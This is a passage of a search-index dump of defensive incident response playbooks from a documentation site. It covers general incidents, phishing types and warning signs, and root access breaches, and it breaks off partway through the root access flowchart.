","version":"Next","tagName":"h3"},{"title":"5. Eradication​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Redback Operations General Incident Response Playbook#5-eradication","content":" Objective: Eliminating threats and any lingering vulnerabilities from Redback's networks and IT systems.**Activities:Removing illegal access and putting compromised systems back in a safe and secure condition.**Upgrading or patching susceptible systems and software to stop further exploitation.Examining and revising security protocols and guidelines to fix flaws or vulnerabilities found.Outcome: Eradicating all evidence of the incident and minimising weaknesses to stop it from happening again.  ","version":"Next","tagName":"h3"},{"title":"6. Recovery​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Redback Operations General Incident Response Playbook#6-recovery","content":" Objective: Restarting company operations and returning impacted systems and data to normal functioning. Activities: Restoring damaged systems and data backups to guarantee the integrity and accessibility of data. Rebuilding or rearranging networks and systems to improve security and stop such incidents in the future. Putting user awareness and education programmes into action to reduce unauthorised access events in the future. Outcome: Full restoration of operations and services, together with strengthened security measures to lessen the chance of recurrence.  ","version":"Next","tagName":"h3"},{"title":"7. Post-Incident Review​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Redback Operations General Incident Response Playbook#7-post-incident-review","content":" Objective: Assessing the organization's reaction to the event, noting lessons gained and opportunities for development.**Activities:Evaluating the incident response procedure in-depth to find its advantages, disadvantages, and potential areas for development.Recording best practices and lessons discovered to improve incident response skills in the future.Modifying security setups, rules, and incident response protocols considering review results.Outcome: Improved capacity for responding to crises and preparedness for new ones.  ","version":"Next","tagName":"h3"},{"title":"6. Terminology​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Redback Operations General Incident Response Playbook#6-terminology","content":" Terminology in incident response encompasses a range of concepts and terms essential for effective communication and understanding within the cybersecurity domain. It provides a common language for incident responders, enabling precise and unambiguous communication during incident response activities.  An essential part of Redback Operations' cybersecurity setup is an intrusion detection system (IDS). IDS keeps an eye on network traffic to look for indications of malicious activity, unauthorised access, or security lapses. Network packets and system logs are analysed by IDS to find anomalies or patterns that point to possible security risks. When an improper usage occurrence occurs, Redback's occurrence Response Team can investigate and take appropriate action based on the alarms generated by IDS.SIEM, or Security Information and Event Management, is essential to Redback's incident response operations. SIEM provides real-time visibility into security incidents by gathering, correlating, and analysing security event data from several sources throughout the IT architecture of the company. SIEM improves Redback's overall security posture and resilience against improper usage incidents by aggregating and correlating security data, making it easier to identify and respond to security threats.Redback uses vulnerability assessment as a preventative strategy to find and fix security flaws in its networks and systems. Redback performs vulnerability assessments to find known vulnerabilities, misconfigurations, or weaknesses that threat actors could exploit through routine scanning and analysis. Redback improves its security defences and lowers the possibility of improper usage situations by prioritising remediation activities according to the severity and impact of vulnerabilities.Redback's cybersecurity defences face a substantial challenge from zero-day vulnerabilities. These vulnerabilities are security holes in software or systems that were previously undiscovered or revealed, making organisations open to abuse by hostile parties. Redback keeps a quick response capability to handle new threats and continually searches for zero-day vulnerabilities. Redback increases its resilience against sophisticated cyber threats and reduces the danger caused by zero-day vulnerabilities by putting proactive measures like threat intelligence sharing and patch management into place. ","version":"Next","tagName":"h2"},{"title":"Phishing Incident Response Playbook","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Phishing Incident Response Playbook","content":"","keywords":"","version":"Next"},{"title":"1. Introduction​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Phishing Incident Response Playbook#1-introduction","content":" ","version":"Next","tagName":"h2"},{"title":"1.1 Overview​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Phishing Incident Response Playbook#11overview","content":" One of the most common, simple yet dangerous security threats that all types of companies now have to deal with are phishing emails. The confidentiality, integrity, and availability of vital assets and data are seriously jeopardised by these attacks. Organisations need to have a thorough and well-defined incident response policy in place to effectively counter this danger while adhering to the minimum actions and questions to be carried out as detailed in the Redback Operations Incident Response Policy.  ","version":"Next","tagName":"h3"},{"title":"1.2 Purpose​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Phishing Incident Response Playbook#12purpose","content":" This playbook's main goal is to give organisation an organised, methodical strategy to identifying, stopping, and minimising the effects of phishing assaults. Its objectives are to help Computer Security Incident Response Team (CSIRT) teams avoid operational disruptions, secure sensitive data, respond quickly to phishing attacks, and preserve the organization's reputation. The playbook provides precise instructions and protocols for phishing attack preparation, detection, analysis, containment, eradication, discovery, and post-event actions. By adhering to the playbook's guidelines, an organisation can improve its incident response capabilities, quickly and effectively combat phishing threats, and solidify itself against changing cyberthreats in the modern digital landscape.  ","version":"Next","tagName":"h3"},{"title":"1.3 Attack Definition​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Phishing Incident Response Playbook#13-attack-definition","content":" The definition of phishing incidents is as follows: “Phishing is the deceptive activity of someone pretending to be a reputable organisation and sending emails, texts, or phone calls in an attempt to trick people into disclosing sensitive information including passwords, banking and credit card details, and personally identifiable information.” These fraudulent emails frequently include links to fake websites or harmful attachments that aim to infect the recipient's device with malware or steal personal information. Phishing attacks pose a serious risk to cybersecurity and data privacy because they utilise social engineering tactics to trick people.  ","version":"Next","tagName":"h3"},{"title":"1.4 Scope​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Phishing Incident Response Playbook#14scope","content":" The handling of phishing attacks is included in the scope of a phishing incident response playbook. It consists of post-event actions, coordination and communication, incident detection, response, and continuous improvement initiatives. The goal of the playbook is to assist CSIRT teams in efficiently identifying, evaluating, and countering phishing attacks while reducing the damage to the company's assets and operations. The playbook also intends to help stakeholders communicate and work together during a phishing event. It is meant for use by everyone involved in phishing incident management.  ","version":"Next","tagName":"h3"},{"title":"2. Attack Types​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Phishing Incident Response Playbook#2-attack-types","content":" The different types of phishing attacks include:  ","version":"Next","tagName":"h2"},{"title":"2.1 Email Phishing​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Phishing Incident Response Playbook#21-email-phishing","content":" This is the most common type of phishing attack, in which hackers send fraudulent emails to people or businesses pretending to be trustworthy organisations like banks, governments, or well-known corporations. Usually, these emails have harmful attachments or links that are meant to fool recipients into downloading malware or disclosing private information.    Signs of Email Phishing:  Requests for personal information: Reputable businesses will never send you an email requesting personal information.Urgent issue: Exercise caution when you receive urgent notifications, such as failed payments or account breaches. To verify, visit the website/ call bank directly rather than clicking any links.Shortened links: Be wary of condensed or shortened links since they could be hiding harmful URLs.Fourth-party email addresses: Verify the integrity of the sender email address; scammers frequently use aliases or other versions of reputable domains.Spelling and grammar issues: Any email that has misspellings or grammar faults should be taken seriously as it may be a sign of phishing.File attachments: Stay away from opening attachments unless they have been confirmed, especially if they have the.exe,.zip, or .scr extensions.Sigle or blank image: Emails with just an image or one blank picture should be avoided since they can include malware that starts downloading automatically.  ","version":"Next","tagName":"h3"},{"title":"2.2 Spear Phishing​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Phishing Incident Response Playbook#22-spear-phishing","content":" Spear phishing consists of extremely focused attacks directed at particular people or departments within a company. To create phishing emails that are more likely to be successful, attackers perform in-depth research to obtain personal information about their targets.    Signs of Spear Phishing:  Unusual requests: To prevent possible scams, confirm through a different channel if coworkers ask for credentials beyond the scope of their position.Shared drive links: Stay away from accessing links that appear to be from internal sources since you probably already have access to shared drives.Unsolicited emails: Be wary of emails offering unsolicited downloads; always verify the sender's authenticity.Personal information: Email scammers may utilise needless personal information to win your trust, so be cautious when responding to such mail.  ","version":"Next","tagName":"h3"},{"title":"2.3 Whaling​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Phishing Incident Response Playbook#23-whaling","content":" Whaling attacks, sometimes referred to as CEO fraud, targets high-profile individuals in an organisation, such as CEOs or senior managers, with the intention of committing financial fraud or stealing confidential data. These attacks may spoof reliable connections or business partners and frequently entail advanced social engineering techniques.    Signs of Whaling:  Inaccurate domain address: To trick people, scammers frequently utilise identical but false domain domains. While checking email addresses, exercise caution.Use of personal email: To reduce the danger of phishing, only use professional emails to communicate with executives or business partners. Verify the sender's identification over an offline channel if the request occurs from a personal email.Requests for new contacts: Be wary of emails from vendors or partners you are not familiar with. Check these messages via proper channels or get in touch with the person in charge directly.  ","version":"Next","tagName":"h3"},{"title":"2.4 Vishing (Voice Phishing)​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Phishing Incident Response Playbook#24-vishing-voice-phishing","content":" This utilises voicemails or phone calls to trick people into divulging private information or carrying out specific tasks, such sending money or exposing up vulnerable networks. Attackers may pretend to be legitimate by using methods like caller ID spoofing.    Signs of Vishing:  Blocked or unidentified numbers: Phishing calls often originate from blocked numbers. If a caller sounds suspicious, hang up immediately.Requests for sensitive information or money: Various entities such as Government organizations, Medicare centres and Financial institutions conduct business through official mail and never request personal information over phone calls.  ","version":"Next","tagName":"h3"},{"title":"2.5 Smishing (SMS Phishing)​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Phishing Incident Response Playbook#25-smishing-sms-phishing","content":" Text messages, or SMS (Short Message Service), are used in smishing attacks to deceive targets into clicking on harmful links or compromising personal information. These messages, which frequently appear to be from reliable sources like banks or government organisations, may advise recipients to act immediately to prevent repercussions.    Signs of Smishing:  Unsolicited texts: Watch out for texts that provide you discounts or freebies on something you didn't sign up for. Phishing texts may also ask for personal information or account verification.Unknown numbers: Exercise vigilance while sending information requests by text. For verification, use a free phone lookup service; stay away from links and other interactions.Authentication requests: Requests for authentication that are not authorised can be signs of attempted account access. To protect your account, quickly change your password.  ","version":"Next","tagName":"h3"},{"title":"2.6 Clone Phishing​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Phishing Incident Response Playbook#26-clone-phishing","content":" Clone phishing is the practice of copying and pasting authentic emails or messages, making little changes (like changing links or attachments), and then delivering them to targets pretending they were the original correspondence. This strategy tries to fool recipients into interacting with the malicious content by taking advantage of their familiarity with the original sender.    Signs of Clone Phishing:  Duplicate emails: Look for copies of emails and closely examine newly added links for any indications of phishing. Always cross-reference connections with earlier correspondence.Misspelt email addresses: Small typos are a common feature of bogus emails, which are sometimes overlooked.Text with hyperlinks: Hover your cursor over links to see the actual URL. Should it diverge from the text that is linked, it can be a sign of phishing.  ","version":"Next","tagName":"h3"},{"title":"2.7 Angler Phishing​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Phishing Incident Response Playbook#27-angler-phishing","content":" Attackers that use social media to conduct angler phishing pose as customer service agents. They make up profiles and message unhappy persons they come across in posts or comments on social media. Once the fraudster has confirmed a few personal data, they offer help and a URL that claims to fix the problem. But the URL is infected with malware, which makes it possible to successfully exploit the victim.    Signs of Angler Phishing:  Unverified account: Official support pages are usually verified and linked directly to the main page. Check the company website for official support contacts.Minimal profile history: Smaller businesses, though unverified, should have a history of customer interactions. New accounts with few followers and no posts are likely attempting to deceive unsuspecting users.  ","version":"Next","tagName":"h3"},{"title":"2.8 Evil twin phishing​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Phishing Incident Response Playbook#28-evil-twin-phishing","content":" Evil twin phishing involves creating a fraudulent Wi-Fi network that mimics a legitimate one, tricking users into connecting to it. Once connected, attackers can intercept sensitive information or deploy malware.    Signs of Evil twin phishing:  Duplicate Wi-Fi hotspots: If you see multiple Wi-Fi networks with the same name, connect only to the secured one requiring a password from the establishment. Connecting to unsecured networks is strongly discouraged for safety.Unsecure warnings: If your device warns that a network is unsecured, consider connecting to a secure network or refrain from connecting altogether.     ","version":"Next","tagName":"h3"},{"title":"3. Stakeholders​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Phishing Incident Response Playbook#3-stakeholders","content":" To minimise the impact on the organisation and prevent further events, early and efficient reaction to a phishing attack depends on strong coordination and collaboration amongst key stakeholders. Responding to a phishing attack usually involves the following key stakeholders:  IT Security Team: The IT Security Team oversees identifying, researching, and preventing phishing attacks. They take the lead in technical response tasks such as phishing email analysis, malicious website blocking, and security breach containment. Incident Response Team: They are responsible for coordinating responses to the phishing issue, which includes interacting with relevant parties, putting incident response protocols into action, and doing post-incident analysis to avert similar attacks in the future. Communications Team: Oversees all internal and external communications regarding the phishing incident, including informing staff members, clients, and other relevant parties and giving them updates on the response activities. Customers: They are the primary targets of phishing assaults and suffer damage instantaneously. This comprises: Customers whose financial and personal information might be lost.Businesses and educational institutions are among the organisations that experience financial losses, reputational harm, and data breaches.Banks and other financial institutions that experience fraudulent transactions and a decline in client confidence.Online retailers who may encounter fraudulent transactions and a decline in customer trust. Third-party Vendors: Third-party vendors, like cybersecurity companies or incident response consultants, may be enlisted to offer specific knowledge and assistance during the response process, based upon the attack's nature and the structure of the organisation.  ","version":"Next","tagName":"h2"},{"title":"4. Flow Diagram​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Phishing Incident Response Playbook#4-flow-diagram","content":"   Preparation (Prep): Yellow Notify IT Security Analyst- The first thing to do is to alert the assigned IT security analyst as soon as you suspect a phishing attempt. To start the incident response procedure as soon as possible, the analyst must be notified. Important information including the threat's nature, the systems that are impacted, and any preliminary findings or proof are all included in this warning. Identification (Identify): Red Block Malicious Emails: As soon as the phishing attempt is verified, all incoming emails that are suspected of being fraudulent should be blocked. By taking this preventive step, users are protected from possible danger and more intrusion into the company's systems are prevented.Disconnect Affected Systems: Meanwhile, all suspected or verified hacked systems are unplugged from the network. The goal of this isolation phase is to reduce possible harm to other systems or data while containing the danger and preventing its spread. Notification (Notif): Violet Change Passwords for Compromised Accounts: Passwords for hacked user accounts are quickly changed as part of incident response to stop unwanted access. This preventive action reduces the possibility that malicious individuals will continue to abuse the situation.Scan Systems for Malware: The impacted computers are thoroughly scanned to find and eliminate any malware or harmful files. Through this scanning procedure, the systems' integrity is guaranteed, and any potential threats are stopped in their tracks.Review Malicious Links/Attachments: All attachments and URLs that might be connected to the phishing effort are carefully examined. This research provides light on the attackers' methodology and motivations in addition to helping to identify the strategies they employ.Blacklist Sender Domains/Addresses: Email addresses and sender domains connected to the phishing effort are blocked. Companies can actively fight against future attacks and protect customers from similar hazards by limiting communication from these sources.Inform Other Analysts of Repeated Attempts: Other security analysts are informed about the phishing effort, including attack tactics and indications of compromise (IOCs). This cooperative strategy strengthens protections against recurring threats and improves situational awareness. Containment (Contain): Sky Blue Error - Unable to Isolate Affected Systems: If isolating the compromised systems doesn't resolve the issue, a senior analyst is notified so they may investigate it more and take appropriate action. By taking this action, you may be confident that the right steps are done to limit the problem and stop it from getting worse.Escalate to Senior Analyst: To help in reaching a well-informed decision, the senior analyst is briefed on the circumstances and given relevant details. By elevating the issue, you can make sure that it gets the focus and resources it needs to be handled successfully. Eradication (Erad): Light Green Record Incident Details: Carefully documented are all the specifics of the happening, such as the timing, effects, and reaction activities. For post-event analysis, legal compliance, and future incident response planning, this material is an invaluable resource.Review Incident with Incident Response Team: Together with the incident response team, a thorough analysis of the occurrence is carried out. The objectives of this post-event study are to identify areas for incident response method improvement, security control gaps, and lessons learned. Recovery (Recover): Brown Continue Monitoring: Ongoing monitoring operations are restarted following the mitigation of the immediate threat and the incident. This entails keeping an eye on user activities, system records, and network traffic to spot any remaining dangers or illegal access. Post-Incident Actions (Post): Light pink Continue Monitoring: Even after the issue has been resolved, ongoing surveillance is still necessary to identify any reappearance of the danger or any fresh security flaws. To improve future issue handling skills, post-event steps should also involve a complete examination of incident response protocols and the implementation of any necessary enhancements.  ","version":"Next","tagName":"h2"},{"title":"5. Incident Response Stages​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Phishing Incident Response Playbook#5-incident-response-stages","content":" ","version":"Next","tagName":"h2"},{"title":"5.1 Preparation​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Phishing Incident Response Playbook#51-preparation","content":" Create and record an incident response plan that outlines the steps, people involved, and their roles.Create an incident response team with responsibilities and escalation protocols well established.To find possible risks and weaknesses, do routine risk assessments.Install security measures including antivirus programmes, firewalls, and intrusion detection systems.Make and keep backups of important information and systems.Employees should get education and awareness campaigns to help them identify and report security problems.Create lines of communication and contact details for reporting and coordinating incidents.  ","version":"Next","tagName":"h3"},{"title":"5.2 Detection​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Phishing Incident Response Playbook#52-detection","content":" Use technology and monitoring tools to keep an eye out for any unusual behaviour, malware infestations, or illegal access.Keep an eye out for any indications of possible security breaches in system logs, network traffic, and security warnings.Correlate and analyse security events with the use of intrusion detection systems (IDS) and security information and event management (SIEM) solutions.Establish alerts and notifications so that security incidents may be quickly detected and addressed.To proactively find vulnerabilities and misconfigurations, conduct routine security audits and scans.  ","version":"Next","tagName":"h3"},{"title":"5.3 Analysis​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Phishing Incident Response Playbook#53-analysis","content":" Examine security events to ascertain their type, extent, and effect on the company.Gather and examine supporting documentation, such as system snapshots, network traffic samples, and logs.Determine the attackers' tactics, methods, and procedures (TTPs) and indications of compromise (IOCs).Work along with pertinent parties, including as IT departments, legal advisors, and law enforcement, if needed.Keep a chain of custody for the evidence gathered during the enquiry and record the results.  ","version":"Next","tagName":"h3"},{"title":"5.4 Containment​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Phishing Incident Response Playbook#54-containment","content":" Act quickly to control the situation, stop more harm from occurring, and stop illegal access.To prevent malware or breach from spreading, isolate the compromised systems or networks from the rest of the infrastructure.Turn off hacked user accounts or services to stop hackers from getting private data.In order to lessen the effect of the event while the investigation and cleanup are ongoing, implement interim remedies or workarounds.Share information about containment efforts and anticipated downtime with all pertinent parties, including management and impacted parties.  ","version":"Next","tagName":"h3"},{"title":"5.5 Eradication​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Phishing Incident Response Playbook#55-eradication","content":" Determine which impacted systems have malicious software or illegal access, then delete it.Fix any security flaws and vulnerabilities that were used during the incident.Perform thorough audits and scans to make sure that all signs of compromise have been removed.To make sure the impacted systems and data are clear of malicious malware and unauthorised alterations, restore them from clean backups.To avoid reoccurring instances, update firewall rules, antivirus signatures, and other security measures.  ","version":"Next","tagName":"h3"},{"title":"5.6 Recovery​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Phishing Incident Response Playbook#56-recovery","content":" As soon as feasible, return all services and operations to normal while maintaining the security and integrity of all data and systems.To ensure their security and operation, test the restored systems and apps.Inform all relevant parties—staff, clients, and partners, for example—about the progress of the healing process and any lingering effects.To find opportunities for process and procedure improvement in incident response, conduct post-event evaluations and identify lessons learned.Based on the lessons learned from the occurrence, update incident response plans, policies, and training materials.  ","version":"Next","tagName":"h3"},{"title":"5.7 Post- Incident Review​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Phishing Incident Response Playbook#57-post--incident-review","content":" Keep a record of the incident response procedure, including deadlines, steps done, and results.Examine how well response activities worked and note any inadequacies or holes in incident response protocols.Have a lessons learned meeting with the incident response team and any pertinent parties to go over accomplishments, difficulties, and areas that may use improvement.Based on the results of the post-event evaluation, update the incident response paperwork, including the plans, processes, and contact lists.To strengthen the organization's overall security posture, share your observations and suggestions with upper management.  ","version":"Next","tagName":"h3"},{"title":"6. Terminology​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Phishing Incident Response Playbook#6-terminology","content":" intrusion detection system (IDS): An intrusion detection system (IDS) is a security instrument that keeps an eye on system or network activity for any illegal activity or policy infractions.Security Information and Event Management (SIEM): A solution called Security Information and Event Management (SIEM) offers in-the-moment security alarm analysis from network hardware and application sources.Vulnerability assessment: Vulnerability assessment is the procedure for locating, measuring, and ranking security holes in a system.Threat Intelligence: Information concerning possible or existing dangers to the security infrastructure of an organisation is known as threat intelligence.Zero-day vulnerabilities: Zero-day vulnerabilities are security holes in hardware or software that are not known to the developer or vendor, leaving attackers free to take advantage of them before a patch or remedy is made available. ","version":"Next","tagName":"h2"},{"title":"Root Access Incident Response Playbook","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Root Access  Incident Response  Playbook","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Root Access  Incident Response  Playbook#introduction","content":" ","version":"Next","tagName":"h2"},{"title":"1.1 Overview​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Root Access  Incident Response  Playbook#11-overview","content":" It is impossible to overestimate the importance of root access security in the context of contemporary cybersecurity. The key to the kingdom is root access, the highest level of administrative rights in a system or network, which provides unrestricted power and control. The availability, confidentiality, and integrity of vital systems and data are seriously threatened by instances of unauthorised access to root privileges, which can happen even with strong security measures in place. This playbook offers an extensive and carefully planned method to efficiently handle and resolve root access incidents in response to this ongoing danger.  ","version":"Next","tagName":"h3"},{"title":"1.2 Purpose​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Root Access  Incident Response  Playbook#12-purpose","content":" This playbook's main goal is to give organisations a strategic framework for negotiating the intricate and varied world of root access issues. It aims to equip stakeholders with the necessary information and resources to mount a coordinated and resilient reaction in the event of such exigencies by outlining precise and doable steps. This playbook also acts as a cornerstone for building organisational resilience, making it possible to quickly limit, mitigate, and recover from root access breaches, minimising potential harm and business operations disruption. This playbook's main goal is to give organisations a strategic framework for negotiating the intricate and varied world of root access issues. It aims to equip stakeholders with the necessary information and resources to mount a coordinated and resilient reaction in the event of such exigencies by outlining precise and doable steps. This playbook also acts as a cornerstone for building organisational resilience, making it possible to quickly limit, mitigate, and recover from root access breaches, minimising potential harm and business operations disruption.  ","version":"Next","tagName":"h3"},{"title":"1.3 Attack Definition​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Root Access  Incident Response  Playbook#13-attack-definition","content":" Any situation in which unauthorised individuals obtain unauthorised access to the highest level of administrative rights on a system or network is referred to as a root access event. In addition to giving the criminals complete control over vital resources, this illicit use of root access has a host of other harmful effects, such as data exfiltration, system modification, service interruption, and reputational harm.  ","version":"Next","tagName":"h3"},{"title":"1.4 Scope​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Root Access  Incident Response  Playbook#14-scope","content":" This playbook covers a broad scope that includes all networks and systems that are part of the organisational domain. Every aspect of the organisational ecosystem is vulnerable to the threat of root access incidents, whether it be on-premises servers or cloud-based infrastructures, legacy systems, or state-of-the-art technologies. Because of this, the playbook's scope is purposefully broad to offer a thorough response structure that is flexible and scalable to a variety of settings and situations.  ","version":"Next","tagName":"h3"},{"title":"2 Attack Types​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Root Access  Incident Response  Playbook#2-attack-types","content":" ","version":"Next","tagName":"h2"},{"title":"2.1 Insider Threat​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Root Access  Incident Response  Playbook#21-insider-threat","content":" Insider threats are a dangerous and sneaky threat that arises when people who are authorised to access organisational resources misuse their access rights for malevolent intent. Insiders are a serious threat to organisational security because they can bypass established safeguards and obtain unauthorised root access by using their in-depth knowledge of systems and protocols. Their motivations might range from financial gain to ideological vendettas.  ","version":"Next","tagName":"h3"},{"title":"2.2 External Attack​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Root Access  Incident Response  Playbook#22-external-attack","content":" Another common way that root access breaches occur is through external attacks, in which remote-operating malefactors try to overcome organisational defences and obtain root rights. These adversaries try to take advantage of weaknesses in systems and networks that are visible to the outside world by using a variety of strategies such malware distribution, exploit kits, and brute force attacks to penetrate the organisational perimeter.  ","version":"Next","tagName":"h3"},{"title":"2.3 Data Breaches​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Root Access  Incident Response  Playbook#23-data-breaches","content":" Incidents involving root access frequently precede data breaches, in which adversaries utilise their enhanced privileges to steal confidential and private material from company archives. These criminals use their unrestricted access to vital systems to steal, exfiltrate, and profit from priceless data assets, harming the organization's reputation and finances greatly. Their motivations may range from corporate espionage to financial gain.  ","version":"Next","tagName":"h3"},{"title":"2.4 Phishing Incidents​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Root Access  Incident Response  Playbook#24-phishing-incidents","content":" Phishing assaults are a pervasive and persistently frustrating form of cyberattack wherein adversaries utilise social engineering techniques to trick unsuspecting consumers into disclosing their login credentials or downloading harmful software. Phishing culprits aim to obtain sensitive information, such as root credentials, by posing as trustworthy organisations or forcing users to click on malicious links. This allows them to get beyond standard security measures and gain unauthorised access to organisational systems.  ","version":"Next","tagName":"h3"},{"title":"2.5 Ransomware Attacks​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Root Access  Incident Response  Playbook#25-ransomware-attacks","content":" The combination of cybercrime and extortion is best exemplified by ransomware assaults, in which adversaries use malicious software to encrypt important data and systems and then hold them captive until a ransom is paid. Root access criminals use their privileged access to launch ransomware campaigns that destroy corporate networks, sabotage operations, and demand astronomical costs—all of which highlight the serious repercussions of root access breaches.  ","version":"Next","tagName":"h3"},{"title":"2.6 Credential Theft​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Root Access  Incident Response  Playbook#26-credential-theft","content":" A nasty and widespread threat vector is credential theft, in which malicious actors use a variety of methods, including keylogging, credential phishing, and password spraying, to get user credentials—even root credentials—illegally. With these credentials in hand, attackers can pose as valid users, get around authentication restrictions, and access vital systems and resources without authorisation. This poses serious dangers to the security and integrity of the organisation.  ","version":"Next","tagName":"h3"},{"title":"3. Stakeholders​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Root Access  Incident Response  Playbook#3-stakeholders","content":" The proficient handling and settlement of root access incidents require the coordinated endeavours and cooperation of a heterogeneous group of stakeholders, each possessing distinct knowledge, viewpoints, and roles. The following parties are essential to the incident response process, from frontline responders entrusted with containment and mitigation to senior leadership tasked with making strategic decisions:  The incident response team, which is made up of knowledgeable cybersecurity experts, incident responders, and forensic analysts, oversees identifying, containing, and resolving access incidents. It is the front line of organisational defence.IT Security Team: Tasked with preserving the confidentiality and integrity of company data and systems, the IT security team is essential in coordinating preventative security actions in response to unusual activity and strengthening defences against root access threats.System Administrators: Using their technical know-how and domain experience to restore system integrity and functionality, system administrators, as stewards of organisational systems and networks, have a significant impact on the identification, investigation, and resolution of root access issues.Legal Department: Charged with managing the complex legal and regulatory environment that surrounds cybersecurity, the legal department offers priceless advice and assistance on contractual requirements, liability issues, and compliance obligations related to root access incidents.Management: Setting organisational priorities, allocating resources, and spearheading strategic efforts aimed at bolstering the organization's resilience against root access threats are all crucial tasks performed by executive leadership, which includes C-suite executives and senior management.External Consultants: Organisations may hire outside consultants or third-party vendors to supplement their incident response capabilities in situations requiring specific knowledge or resources. These vendors can help with forensic analysis, threat intelligence, and remediation efforts.  ","version":"Next","tagName":"h2"},{"title":"4. Flow Chart​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Root Access  Incident Response  Playbook#4-flow-chart","content":"   Preparation (Prep): Yellow  Notify Incident Response Team: The first steps in becoming ready to handle a root access event are taken during this phase. The incident response team is instantly contacted to initiate the response process upon detection of a root access breach. This preliminary stage is symbolised by the colour yellow, which emphasises the necessity of being ready and moving quickly.  Identification (Identify): Red  Contain the Incident; Isolate Affected Systems: At this point, the main priorities are locating the root access issue and containing it right away. Aims are set to contain the spread of unauthorised access and isolate compromised systems. Red emphasises the necessity for quick containment measures by signifying the urgency and crucial nature of this stage.  Notification (Notif): Violet  Review and Update Antivirus Definitions; Perform Full System Scans: During this phase, early mitigation actions are implemented, and pertinent parties are notified. To lessen the effects of the root access breach, precautions including comprehensive system scans and antivirus definition updates are 